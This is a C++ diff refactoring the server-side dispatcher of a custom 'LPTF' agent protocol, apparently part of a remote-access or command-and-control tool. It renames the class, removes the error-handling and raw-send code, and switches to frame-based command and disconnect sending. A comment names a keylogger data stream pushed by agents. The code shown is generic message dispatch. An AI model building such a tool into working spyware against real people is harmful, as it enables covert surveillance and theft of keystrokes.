@@ -1,10 +1,10 @@
-#include "dispatcher.hpp"
+#include "server_dispatcher.hpp"
 
 #include <stdexcept>
 
-Dispatcher::Dispatcher() {}
+ServerDispatcher::ServerDispatcher() {}
 
-void Dispatcher::dispatch(AgentSession& agent, const Frame& frame) {
+void ServerDispatcher::handleFrame(AgentSession& agent, const Frame& frame) {
   switch (frame.header.type) {
     case MessageType::REGISTER:
       onRegister(agent, frame.payload);
@@ -30,7 +30,7 @@ void Dispatcher::dispatch(AgentSession& agent, const Frame& frame) {
 
 // The first message from the agent must always be REGISTER.
 // Once we know who it is, we kick off the command sequence.
-void Dispatcher::onRegister(AgentSession& agent,
+void ServerDispatcher::onRegister(AgentSession& agent,
                             const std::vector<std::uint8_t>& payload) {
   RegisterPayload agentInfo = ProtocolParser::parseRegisterPayload(payload);
   agent.setAgentInfo(agentInfo);
@@ -46,7 +46,7 @@ void Dispatcher::onRegister(AgentSession& agent,
 
 // A RESPONSE carries the same id as the COMMAND it answers,
 // plus chunk metadata for large payloads split across messages.
-void Dispatcher::onResponse(AgentSession& agent,
+void ServerDispatcher::onResponse(AgentSession& agent,
                             const std::vector<std::uint8_t>& payload) {
   const ResponsePayload response =
       ProtocolParser::parseResponsePayload(payload);
@@ -65,22 +65,15 @@ void Dispatcher::onResponse(AgentSession& agent,
 // DATA messages are pushed by the agent without a prior COMMAND
 // (e.g. keylogger stream). Handle them independently of the
 // request/response cycle.
-void Dispatcher::onData(const std::vector<std::uint8_t>& payload) {
+void ServerDispatcher::onData(const std::vector<std::uint8_t>& payload) {
   const DataPayload data = ProtocolParser::parseDataPayload(payload);
   std::cout << "[← DATA] subtype=" << static_cast<int>(data.subtype) << "\n"
             << data.data << "\n";
 }
 
-void Dispatcher::onError(const std::vector<std::uint8_t>& payload) {
-  const ErrorPayload error = ProtocolParser::parseErrorPayload(payload);
-  std::cerr << "[← ERROR] code=" << static_cast<int>(error.code)
-            << "  msg=" << error.message << "\n";
-  //   running = false;
-}
-
 // ── Outgoing senders ─────────────────────────────────────────
 
-void Dispatcher::sendCommand(AgentSession& agent, CommandType type,
+void ServerDispatcher::sendCommand(AgentSession& agent, CommandType type,
                              const std::string& data) {
   CommandPayload command;
   command.id = nextId();
@@ -88,57 +81,22 @@ void Dispatcher::sendCommand(AgentSession& agent, CommandType type,
   command.data = data;
   const std::vector<std::uint8_t> payload =
       ProtocolSerializer::serializeCommandPayload(command);
-  sendRaw(agent, MessageType::COMMAND, payload);
+
+  Frame frame = {SocketHelper::createHeader(MessageType::COMMAND, payload),
+                 payload};
+  sendFrame(agent, frame, senderName);
+  // sendRaw(agent, MessageType::COMMAND, payload);
   std::cout << "[→ COMMAND] id=" << command.id
             << "  type=" << static_cast<int>(command.type) << "\n";
 }
 
-void Dispatcher::sendError(AgentSession& agent, ErrorType code,
-                           const std::string& msg) {
-  ErrorPayload error;
-  error.code = code;
-  error.message = msg;
-  const std::vector<std::uint8_t> payload =
-      ProtocolSerializer::serializeErrorPayload(error);
-  sendRaw(agent, MessageType::ERROR, payload);
-}
-
-void Dispatcher::sendDisconnect(AgentSession& agent) {
-  sendRaw(agent, MessageType::DISCONNECT);
+void ServerDispatcher::sendDisconnect(AgentSession& agent) {
+  const std::vector<uint8_t> payload{};
+  Frame frame = {SocketHelper::createHeader(MessageType::DISCONNECT, payload)};
+  // sendRaw(agent, MessageType::DISCONNECT);
+  sendFrame(agent, frame, senderName);
   std::cout << "[→ DISCONNECT]\n";
   //   running = false;
 }
 
-void Dispatcher::sendRaw(AgentSession& agent, MessageType type,
-                         const std::vector<std::uint8_t>& payload) {
-  if (payload.size() > MAX_VALUE_INT16) {
-    throw std::runtime_error("payload too large for LPTF header size field");
-  }
-
-  LptfHeader header{{'L', 'P', 'T', 'F'},
-                    LPTF_VERSION,
-                    type,
-                    static_cast<std::uint16_t>(payload.size())};
-
-  const std::vector<std::uint8_t> headerBytes =
-      ProtocolSerializer::serializeHeader(header);
-  const std::size_t expectedHeaderBytes = headerBytes.size();
-  const SocketResult headerResult = agent.socket->send(headerBytes);
-  if (!headerResult.ok() ||
-      static_cast<std::size_t>(headerResult.bytesTransferred) !=
-          expectedHeaderBytes) {
-    throw std::runtime_error("failed to send LPTF header");
-  }
-
-  if (!payload.empty()) {
-    const std::size_t expectedPayloadBytes = payload.size();
-    const SocketResult payloadResult = agent.socket->send(payload);
-    if (!payloadResult.ok() ||
-        static_cast<std::size_t>(payloadResult.bytesTransferred) !=
-            expectedPayloadBytes) {
-      throw std::runtime_error("failed to send LPTF payload");
-    }
-  }
-}
-
-std::uint16_t Dispatcher::nextId() { return nextCmdId++; }
+std::uint16_t ServerDispatcher::nextId() { return nextCmdId++; }
